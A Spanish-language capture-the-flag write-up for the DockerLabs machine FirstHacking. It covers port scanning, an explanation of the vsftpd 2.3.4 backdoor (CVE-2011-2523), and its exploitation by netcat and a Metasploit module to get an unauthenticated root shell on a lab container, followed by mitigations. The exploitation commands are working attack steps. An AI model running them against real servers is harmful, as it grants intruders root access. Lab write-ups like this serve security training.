
# DockerLabs: FirstHacking — Writeup

![Dificultad](https://img.shields.io/badge/Dificultad-Muy%20Fácil-brightgreen)
![Plataforma](https://img.shields.io/badge/Plataforma-DockerLabs-blue)
![Categoría](https://img.shields.io/badge/Categoría-FTP%20%7C%20Backdoor-orange)

Writeup técnico de la máquina **FirstHacking** de [DockerLabs](https://dockerlabs.es), pensado con fines educativos para practicar enumeración de servicios y explotación de vulnerabilidades conocidas.

> ⚠️ Este documento tiene fines exclusivamente formativos. Todo lo aquí descrito se realizó en un entorno controlado y aislado (contenedor Docker de DockerLabs), nunca contra sistemas de producción sin autorización.

## 🗺️ Resumen general

| | |
|---|---|
| **Entorno** | DockerLabs |
| **Máquina** | FirstHacking |
| **Dificultad** | Muy Fácil |
| **Conceptos clave** | Enumeración FTP, Banner Grabbing, CVE-2011-2523, análisis de procesos |
| **Herramientas** | Nmap, Netcat |

---

## Paso 00: Despliegue del entorno

```bash
# Descomprimir la máquina descargada desde DockerLabs
unzip firsthacking.zip

# Pasar a superusuario
sudo su

# Desplegar el contenedor
sudo ./auto_deploy.sh firsthacking.tar
```

El script `auto_deploy.sh` automatiza la carga de la imagen Docker y el arranque del contenedor, asignándole una IP dentro de la red interna de Docker (en mi caso, `172.17.0.2`).

---

## 🔍 Paso 01: Reconocimiento y enumeración

### Escaneo de puertos con Nmap

```bash
sudo nmap -p- --open -sS -sC -sV -min-rate 500 -n -Pn 172.17.0.2 -oG nmap_inicial.txt
```

**Resultado:**

```
Starting Nmap 7.99 ( https://nmap.org )
Nmap scan report for 172.17.0.2
Host is up (0.0000050s latency).
Not shown: 65534 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 2.3.4
MAC Address: 82:42:24:11:33:8F (Unknown)
Service Info: OS: Unix
```

**Hallazgo:** un único puerto abierto, **21/TCP**, corriendo **vsFTPd 2.3.4**.

Esa versión concreta es la señal de alarma: es la versión históricamente asociada a un backdoor muy conocido.

---

## 🧠 Paso 02: Análisis de la vulnerabilidad

**Identificador:** CVE-2011-2523

En julio de 2011 se descubrió que el paquete fuente de **vsFTPd 2.3.4** alojado en el sitio oficial había sido reemplazado por un tercero no autorizado por una versión modificada. Esa versión troyanizada contiene una puerta trasera (*backdoor*): si durante el login FTP se introduce como nombre de usuario una cadena que termine en la carita `:)` (smiley), el servicio abre una **shell de comandos en texto plano en el puerto TCP 6200**.

No se trata de un fallo de programación de vsFTPd en sí, sino de una versión maliciosa distribuida temporalmente por el sitio de descargas oficial, motivo por el que se convirtió en una de las vulnerabilidades más citadas en máquinas de nivel introductorio (Metasploitable2, HTB "Lame", etc.).

---

## 💥 Paso 03: Explotación

### Opción A — Manual con Netcat

1. Conectar al servicio FTP:

```bash
nc -nv 172.17.0.2 21
```

2. Introducir como usuario una cadena que contenga la carita `:)` (por ejemplo `user:)` seguido de cualquier contraseña). Esto activa el backdoor internamente.

3. En otra terminal, conectar directamente al puerto que queda abierto tras el disparo:

```bash
nc -nv 172.17.0.2 6200
```

4. Si el backdoor se activó correctamente, se obtiene una shell de root sin autenticación:

```bash
whoami
# root
id
# uid=0(root) gid=0(root) groups=0(root)
```

### Opción B — Con exploit automatizado (Metasploit)

```bash
msfconsole -q
use exploit/unix/ftp/vsftpd_234_backdoor
set RHOSTS 172.17.0.2
run
```

Metasploit automatiza los pasos anteriores: envía el nombre de usuario con la carita, espera el tiempo necesario y se conecta al puerto 6200 directamente, devolviendo una sesión de comandos.

---

## 🚩 Paso 04: Post-explotación y captura de la flag

Una vez dentro con la shell obtenida:

```bash
# Estabilizar la shell (opcional, si es una shell simple)
python3 -c 'import pty; pty.spawn("/bin/bash")'

# Ubicar la flag
find / -iname "*flag*" 2>/dev/null
cat /root/flag.txt   # ruta orientativa, ajustar según lo que encuentres
```

> ✏️ **Sustituye este bloque por la ruta y el contenido real de la flag que obtuviste en tu propia ejecución** — cada despliegue de DockerLabs puede variar ligeramente.

```
[PEGAR AQUÍ LA FLAG OBTENIDA]
```

---

## 📌 Conclusiones

- Un simple *banner grabbing* con Nmap fue suficiente para identificar una versión de software con una vulnerabilidad crítica pública y documentada.
- El caso de vsFTPd 2.3.4 recuerda la importancia de **verificar la integridad de los paquetes descargados** (checksums, firmas GPG) ante posibles compromisos en la cadena de suministro de software.
- Mantener los servicios actualizados y monitorizar versiones expuestas es una medida de mitigación básica pero esencial.

## 🛡️ Mitigación

- Actualizar a una versión de vsFTPd posterior y verificada oficialmente.
- Restringir el acceso FTP mediante firewall a IPs de confianza.
- Sustituir FTP en texto plano por SFTP/FTPS.
- Monitorizar procesos y puertos inusuales (como el 6200) mediante IDS/IPS.

---

## 📚 Referencias

- [CVE-2011-2523 — NVD](https://nvd.nist.gov/vuln/detail/CVE-2011-2523)
- [DockerLabs](https://dockerlabs.es)
- [Exploit-DB — vsftpd 2.3.4 Backdoor Command Execution](https://www.exploit-db.com/exploits/49757)

---

*Writeup elaborado con fines educativos sobre la máquina FirstHacking de DockerLabs.*
